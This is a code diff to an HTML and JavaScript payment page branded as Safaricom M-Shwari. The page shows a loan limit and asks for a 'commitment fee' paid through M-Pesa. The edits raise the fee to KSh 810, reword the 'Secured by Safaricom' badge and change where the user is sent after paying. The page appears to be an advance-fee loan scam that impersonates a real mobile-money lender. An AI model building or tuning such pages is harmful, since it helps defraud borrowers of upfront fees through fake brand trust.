@@ -130,7 +130,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
       <div class="invoice-limit">Selected M-Shwari Loan Limit: <span>KSh <span id="limit">—</span></span></div>
       <div class="invoice-amount-row">
         <div class="invoice-currency">KSh</div>
-        <div class="invoice-amount">610</div>
+        <div class="invoice-amount">810</div>
         <div class="invoice-label">Amount Due</div>
       </div>
     </div>
@@ -173,7 +173,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
     </div>
     <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>
 
-    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 610 Now</button>
+    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 810 Now</button>
 
     <div class="spinner" id="spinner">
       <div class="loader"></div>
@@ -182,7 +182,7 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#e8f5e9;min-height:100vh
 
     <div class="status-msg" id="statusMsg"></div>
 
-    <div class="secure-note">🔒 Secured by Safaricom M-Pesa</div>
+    <div class="secure-note">🔒 Secured by Safaricom M-Shwari</div>
   </div>
 
 </div>
@@ -242,7 +242,7 @@ document.getElementById("limit").innerText = selectedAmount;
 /* =========================
    COMMITMENT FEE
 ========================= */
-const COMMITMENT_FEE = 10;
+const COMMITMENT_FEE = 810;
 
 document.querySelector(".invoice-amount").innerText = COMMITMENT_FEE;
 
@@ -538,7 +538,7 @@ function startCountdown(seconds) {
 ========================= */
 function goNext() {
   clearTimeout(redirectTimer);
-  window.location.href = "payment3.html";
+  window.location.href = "dashboard.html";
 }
 
 /* =========================
